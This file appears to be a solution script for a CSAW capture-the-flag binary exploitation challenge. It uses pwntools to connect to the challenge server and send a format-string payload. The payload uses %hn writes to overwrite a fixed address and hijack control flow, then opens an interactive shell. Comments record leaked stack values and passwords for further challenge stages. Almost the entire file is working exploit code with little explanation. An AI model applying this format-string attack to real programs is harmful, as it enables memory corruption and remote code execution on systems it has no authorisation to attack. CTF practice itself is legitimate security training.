from pwn import *
ex = 0x804e028
h,p = 'auto-pwn.chal.csaw.io', 11003
sh = remote(h,p)
filename = './raw_binary3'
# sh = process(filename)
pas = "0619b9a41fcc3e30b1e0cc206d58c37e"
elf = ELF(filename)
#libc = elf.libc
# gdb.attach("raw_binary")
# sh = gdb.debug(filename) # type: pwnlib.tubes.process.process
# sh = remote('127.0.0.1', 7777)
# 0x960xf7f635a00x804a0fb0x8869008.0x702501550x2e70252e.0x252e7025.0x70252e70.0x252e7025.0x70252e700x2e70252e.0x70257025.0x2e70252e.0x252e7025.0x70252e70
# AAAAAA0x960xf7f855a00x804a0fb0x88d40080x414101550x41414141.0x252e7025.0x70252e70.0x2e70252e
# parameter 6
w,n = 0x804,0x96F6
exp = "AA"+p32(ex+2)+p32(ex)+"%"+ str(w-10) +"c%6$hn%"+ str(n-w) +"c%7$hn"
print exp
sh.sendline(pas)
sh.recvuntil("will generate a report!!")
sh.sendline(exp)
sh.interactive()

# Sorry, but your flag is in another box! 
# nc auto-pwn.chal.csaw.io 11002 
# and use password 
# 4a47f4618ce3e7b567cce92b48f41e61

# Sorry, but your flag is in another box! 
# nc auto-pwn.chal.csaw.io 11003 
# and use password 
# 0619b9a41fcc3e30b1e0cc206d58c37e


# Sorry, but your flag is in another box! nc auto-pwn.chal.csaw.io 11004 and use password bc53f7d2068355128e0bd28e40513d53


